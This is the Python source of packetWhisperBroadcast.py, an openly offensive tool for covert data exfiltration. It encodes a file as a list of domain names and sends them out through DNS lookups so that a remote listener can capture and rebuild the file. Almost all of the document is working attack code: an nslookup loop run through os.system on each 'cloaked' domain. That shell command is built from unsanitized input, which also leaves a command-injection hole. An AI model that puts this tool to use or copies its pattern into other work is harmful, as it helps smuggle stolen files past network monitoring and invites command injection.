#!/usr/bin/python
# 
# Filename:  packetWhisperBroadcast.py 
#
# Version: 1.0.0
#
# Author:  Joe Gervais (TryCatchHCF)
#
# Summary:  Exfiltrates a file from one system to another without direct connection,
# using broadcast DNS requests as the file transmission method. The file to exfiltrate
# is transformed into a list of domain name strings. packetWhisperBroadcast.py then 
# makes a DNS name query for each domain name.
#
# The receiving system captures the DNS queries using tcpdump, extracts the domain
# name strings, reconstructs the cloaked file, then tranforms the exfiltrated data
# back into its original file format. 
#
# Uses cloakify.py from the Cloakify Exfiltration Toolset
#
# Description:  

# The transmitter takes a payload that has been cloaked into a list of domain names
# (via Cloakify Exfiltration Toolset) and performs a DNS lookup on each domain.
#
# The receiver runs tcpdump to capture DNS queries on the local network (or anywhere
# else that it is in place to see), extracts the queried domain names from the 
# captured DNS requests, writes them a file, and "decloaks" the payload using
# Cloakify's decloakify.py script (and Top100DomainNames cipher).
#
# Example:  
#
# On broadcasting system:
#
#   $ ./packetWhisperBroadcast.py <cloakedList>
#
# On receiving system:
#
#   $ ./packetWhisperExtract.py <capture.pcap>
# 

import os, sys, socket

def PacketWhisperBroadcast( arg1 ):

	tmpAddrStr = ""

	with open( arg1, 'r' ) as fqdnFile:

		#s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    		for fqdn in fqdnFile:

			fqdnStr = fqdn.strip()
			print fqdnStr

			try:
				commandStr = "nslookup " + fqdnStr
				os.system( commandStr )

				os.system( "sleep 1" )
		
			except:
				os.system( "sleep 1" )

	return( 1 )


if __name__ == "__main__":

	if ( len(sys.argv) != 2 ):
		print "usage: packetWhisperBroadcast.py <payloadFilename>"
		exit

	else:
		PacketWhisperBroadcast( sys.argv[1] )

